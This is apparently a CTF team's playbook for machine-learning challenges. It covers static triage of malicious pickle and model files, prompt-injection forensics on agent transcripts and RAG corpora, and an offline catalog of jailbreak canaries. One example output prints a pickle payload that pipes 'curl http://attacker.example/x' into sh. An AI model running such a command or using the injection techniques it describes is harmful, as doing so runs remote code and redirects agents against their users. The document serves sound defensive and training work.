# ML playbook (CSCTF 2026)

Two shapes of ML challenge show up:

1. **Model-file forensics** — a serialized model (pickle, PyTorch, joblib, numpy,
   safetensors, GGUF, ONNX, Keras/HDF5). The flag, a malicious payload, or the "what does
   this model do" answer is **in the bytes/metadata**. The classic is a pickle that runs code
   on `load()`.
2. **Agent / prompt-injection forensics** — an agent transcript, MCP/agent config, or RAG
   corpus where you trace a prompt injection, a tool call to a host no user asked for, a
   poisoned document, or hidden text.

The flag is `csctf{...}` / `chronos{...}` / `flag{...}`.

> **Hard rule (player's standing preference + AGENTS.md):** these engines **never load,
> unpickle, or import** a model — they walk opcodes/parse structure statically, so analysis
> is safe on the Mac. If a challenge genuinely requires *executing* the model or an extracted
> payload to get the flag, that runs **only in `tools/sandbox.py` (Docker)**, never on the host.

Setup:

```sh
cd <ctf-tools checkout>                   # every command on this page runs from the checkout root
export CTF_EVENT=<event slug>             # the event profile, events/<slug>/event.toml
.venv/bin/python -m ctf workdir --create  # the workdir (ctf.paths): $CTF_WORKDIR, else ~/ctf-work/<event>
PY=.venv/bin/python
CH="$($PY -m ctf workdir)/<id>-<slug>"   # the challenge folder; its files are in $CH/files/
```

---

## First moves (the moment you open it)

1. `./csctf check <id>` — skip if the team already solved it.
2. `file *` and look at extensions, but **don't trust them** — a `.bin`/`.pt`/`.ckpt`/`.model`
   is often a pickle; a `.safetensors`/`.gguf`/`.onnx` has its own magic.
3. Run the model-file triage (triage routes ML here):
   ```sh
   $PY solvers/toolkits/ai_model_files.py "$CH"/files/*        # one-shot triage of every file
   ```
4. If it's a transcript / config / corpus (JSON/JSONL/YAML/dir/zip of docs), run:
   ```sh
   $PY solvers/toolkits/agent_trace.py "$CH"/files/*
   ```
5. **Do not open the model in Python to "see what it is."** Unpickling is the trap — the
   engines read it without loading it.

---

## Engine CLIs

### Model-file forensics
```sh
$PY solvers/toolkits/ai_model_files.py <file>... [--json]
#   Static triage. Recognizes pickle, PyTorch zip, joblib, numpy .npy/.npz, safetensors,
#   GGUF, ONNX, Keras/HDF5. For a pickle it does a pickletools.genops walk with a symbolic
#   stack (protocols 0-5) and prints: protocol, opcode count, GLOBAL targets, every REDUCE/
#   INST with its arguments, and flags a code-exec callable with "<-- runs code on load".
#   It also extracts urls/domains, and for the typed formats prints tensors, dtypes, shapes,
#   __metadata__, GGUF/ONNX metadata, external-data paths. --json gives the full structured
#   report incl. every callable. Nothing is ever unpickled/loaded.
```
Example (a pickle built to run a command — the engine only reads opcodes):
```
reduce posix.system("curl http://attacker.example/x | sh")  <-- runs code on load
urls: http://attacker.example/x
domains: attacker.example
```
Reader library behind it is **`solvers/common/ai_model_files.py`** (`analyze`, `read_pickle`,
`read_gguf`, `read_safetensors`, `read_onnx`, `read_npy/npz`, `read_torch_zip`,
`read_keras_zip`, `read_hdf5`). Call it directly for scripted analysis:
```sh
$PY -c 'import sys; sys.path.insert(0,"solvers/common"); import ai_model_files as a; \
        print(a.public(a.analyze(open("model.pkl","rb").read(),"model.pkl")))'
```
Fields of interest: the one callable a pickle invokes, a command string, a URL, the pickle
protocol, a tensor name, a metadata value by key, a Keras **Lambda** layer, an ONNX external-
data path. The toolkit tags byte-exact facts `plain` and author-spelled facts `unsure`.

### Agent / prompt-injection forensics
```sh
$PY solvers/toolkits/agent_trace.py <file|dir|zip>... [--json]
#   Parses agent transcripts (OpenAI/Anthropic/generic chat), MCP + agent configs, and RAG
#   corpora. Prints: each transcript row (role/tool/content), prompt injections surfaced
#   ("INJECTED FROM TOOL OUTPUT row N tool=... why=instruction"), tool calls that leave for a
#   host no user turn named, MCP servers/tools, colliding or flagged tools, documents and the
#   poisoned ones, and hidden-text findings. Prints a signals score. --json for structure.
#   Every string is DATA: text that "addresses the solver" is reported, never acted on.
```
Use it to answer "which turn/tool injected the instruction", "which host was the data
exfiltrated to", "which document is poisoned", "what hidden text is in the corpus".

---

## Docker tools (rarely needed — detonation only)

ML analysis is static, so you usually need **no sandbox**: the engines already prove an RCE
pickle, extract the command/URL, and read all metadata without loading anything. Reach for
Docker only when the flag can't be read statically and the challenge truly requires
**running** the model or a payload:

```sh
# untrusted model/script executed only inside the --network none, caps-dropped container:
$PY tools/sandbox.py run --in suspicious.pkl python3 -I {in}      # if you must execute it
$PY tools/sandbox.py run --in model.onnx     strings -n 6 {in}
```
`csctf-sandbox:2` ships `python3 -I` (with numpy/scipy/Pillow/scapy and the `fickling` pickle
library importable inside it), plus `strings`/`objdump`/`readelf`/`binwalk`/`yara`. Note
`fickling` is a *library* in the image, not an allow-listed sandbox tool, so invoke it through
`python3` inside the container. **Never** run an untrusted model on the Mac to "just see the
output" — that is the whole exploit.

---

## Techniques → engines (CSCTF-relevant)

| What you suspect | Do this |
| --- | --- |
| Pickle runs code on load (`__reduce__` → `os.system`/`exec`/`eval`/`subprocess`) | `ai_model_files.py` → read the `reduce ... <-- runs code on load` line |
| Malicious PyTorch `.pt`/`.ckpt` (zip wrapping `data.pkl`) | `ai_model_files.py` (walks the inner pickle) |
| Flag hidden in `__metadata__` / GGUF kv / ONNX metadata_props | `ai_model_files.py` (prints metadata by key) |
| Keras **Lambda** layer carrying code | `ai_model_files.py` / `read_keras_zip` |
| ONNX/torch external-data path points somewhere | `ai_model_files.py` (external-data locations) |
| C2 URL/domain embedded in the model | `ai_model_files.py` (urls/domains) |
| numpy object array (pickled inside `.npy`/`.npz`) | `ai_model_files.py` (walks the object pickle) |
| Prompt injection in an agent transcript | `agent_trace.py` (INJECTED FROM TOOL OUTPUT) |
| Tool call exfiltrates to an un-asked host | `agent_trace.py` (host first seen in a tool output) |
| Poisoned RAG document / hidden text in a corpus | `agent_trace.py` (docs + hidden-text findings) |
| MCP config with a rogue/colliding tool | `agent_trace.py` (servers/tools, flagged) |

---

## Get the flag out & submit

1. Read the flag from engine output — a metadata value, an extracted command/URL argument, a
   decoded string, or (agent) the injected/poisoned content. Confirm `csctf{...}` /
   `chronos{...}` format.
2. Note the provenance in `notes.md`.
3. Submit once:
   ```sh
   ./csctf submit <id> 'csctf{...}' --note 'pickle REDUCE arg / GGUF metadata key'
   ```
   Or from a solver: `ctf.submit.guarded_submit(ctfd, ch, flag, provenance="...", team_solved=...)`
   (format-checks, dedupes, paces, skips team-solved, **stops after 3 wrong**). Never loop
   candidate flags.

**Scope / rate (when the ML challenge is a *live* model/chatbot).** `agent_trace` explicitly
does **not** play a live target — for a jailbreak/extraction challenge against a hosted model,
that endpoint is in scope **only if it's the squad's assigned target**. No flooding, no
automated mass prompting, no flag brute-forcing (AGENTS.md). Reason to one prompt/one answer;
don't hammer the endpoint. Keep offline model/transcript analysis offline.

## Static AI/model security triage

`solvers/toolkits/ml_security.py model artifact --json` reads model containers structurally—never via
pickle, Keras, Torch, ONNX Runtime, or a custom op. It reports dangerous pickle REDUCE/STACK_GLOBAL
gadgets, Keras/HDF5 Lambda/config objects, ONNX external/custom operators, GGUF metadata risks, and
bounded tensor metadata/statistics. `transcript` scans supplied agent/RAG logs against a versioned
prompt-injection corpus and labels source-to-instruction/control-channel evidence; `model-card`
cross-checks claims and tensor summaries. Findings are ranked leads, not proof that code executed.

## LLM security, jailbreak and encoded-prompt corpus

`solvers/toolkits/llm_security.py` is a fully offline companion. It never imports a model SDK or sends
a prompt. Its catalog contains inert direct, indirect, multi-turn, delimiter, tool-abuse, base64,
Unicode-tag, homoglyph and RAG-poisoning canaries for a human to review:

```sh
$PY solvers/toolkits/llm_security.py catalog
$PY solvers/toolkits/llm_security.py text suspicious.txt
$PY solvers/toolkits/llm_security.py transcript saved-chat.json
$PY solvers/toolkits/llm_security.py rag retrieved-documents.json
$PY solvers/toolkits/llm_security.py extraction saved-query-log.json
$PY solvers/toolkits/llm_security.py perturbation vectors.json
```

The detector inspects original, NFKC, common Greek/Cyrillic confusable, HTML/entity, URL-percent,
Unicode-tag, zero-width-bit, base64, hex and ROT13 views. Every hit retains the transform and whether
that decode was unambiguous. Transcript analysis distinguishes direct user text from indirect tool /
retrieval text and reports calls absent from a caller-supplied tool allowlist. RAG analysis preserves
document IDs, exact duplicate provenance and retrieval score. System/developer-prompt leak, hidden
policy, tool-schema and hidden-reasoning phrases are lexical evidence only—not proof that a secret was
actually revealed.

The perturbation helper computes exact L0/L1/L2/Linf distances over supplied vectors; it explicitly
does not claim the change fools a model. The extraction audit operates only over a saved transcript and
labels high-volume, mostly-unique query patterns for review. Any live LLM challenge remains restricted
to its assigned target and human-approved, reasoned prompts—never mass prompting or a candidate sweep.

### Exact linear rule across a change point
A numeric score history plus probe rows (CSV/TSV/NPZ) and a quantize-and-hash fingerprint: see
`solvers/toolkits/tabular_fit.py` and the misc playbook section "Score history across a rule change".
